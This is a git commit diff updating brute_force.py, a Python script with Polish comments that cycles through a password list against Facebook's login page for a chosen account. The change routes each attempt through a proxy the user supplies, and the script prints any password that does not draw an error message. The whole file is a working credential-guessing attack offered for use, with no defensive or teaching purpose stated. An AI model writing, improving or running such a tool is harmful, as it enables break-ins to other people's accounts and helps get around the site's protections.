f8ac7765a280dec2f7514c89f6af694364b337fd
Kamil01 <107310243+Adminek01@users.noreply.github.com>
2023-11-21 14:41:48 +0100

    Update brute_force.py

--- brute_force.py
+++ brute_force.py
@@ -1,42 +1,44 @@
 import requests
-from requests_toolbelt.adapters import appengine
-
-# Dodaj wsparcie dla serwera VPN
-appengine.monkeypatch()
-
 import time
 import random
 import re
-from bcrypt import hashpw, checkpw
+from requests.auth import HTTPProxyAuth
 
 def verify_password(password, hashed_password):
-    return checkpw(password.encode('utf-8'), hashed_password.encode('utf-8'))
+    # Implementacja funkcji weryfikującej hasło (jeśli jest potrzebna)
+    pass
 
 def read_passwords_from_file(filename):
     with open(filename, 'r') as file:
         return file.read().splitlines()
 
 def brute_force(username, fb_id, passwords):
+    proxy = input('Podaj adres proxy (format: http://username:password@proxy_ip:proxy_port): ')
+
     for password in passwords:
-        # Wykonaj zapytanie do Facebooka przez serwer VPN
-        with requests.Session() as session:
-            response = session.post('https://www.facebook.com/login.php', data={
-                'email': username,
-                'password': password,
-                'login': 'Log In'
-            })
+        # Wykonaj zapytanie do Facebooka przez serwer proxy
+        proxies = {
+            "http": proxy,
+            "https": proxy,
+        }
 
-            # Sprawdź odpowiedź
-            if "Nieprawidłowe hasło" not in response.text and "Spróbuj ponownie później" not in response.text:
-                # Hasło zostało znalezione
-                print('Znaleziono hasło:', password)
-                return
+        response = requests.post('https://www.facebook.com/login.php', data={
+            'email': username,
+            'password': password,
+            'login': 'Log In'
+        }, proxies=proxies)
 
-            # Hasło nie zostało znalezione
-            print('Nieprawidłowe hasło:', password)
+        # Sprawdź odpowiedź
+        if "Nieprawidłowe hasło" not in response.text and "Spróbuj ponownie później" not in response.text:
+            # Hasło zostało znalezione
+            print('Znaleziono hasło:', password)
+            return
 
-            # Opóźnij przed kolejną próbą
-            time.sleep(2)  # Możesz dostosować czas opóźnienia według potrzeb
+        # Hasło nie zostało znalezione
+        print('Nieprawidłowe hasło:', password)
+
+        # Opóźnij przed kolejną próbą
+        time.sleep(2)  # Możesz dostosować czas opóźnienia według potrzeb
 
 def main():
     # Pobierz dane użytkownika
@@ -54,7 +56,6 @@ def main():
 
 if __name__ == '__main__':
     main()
-
 
 
 
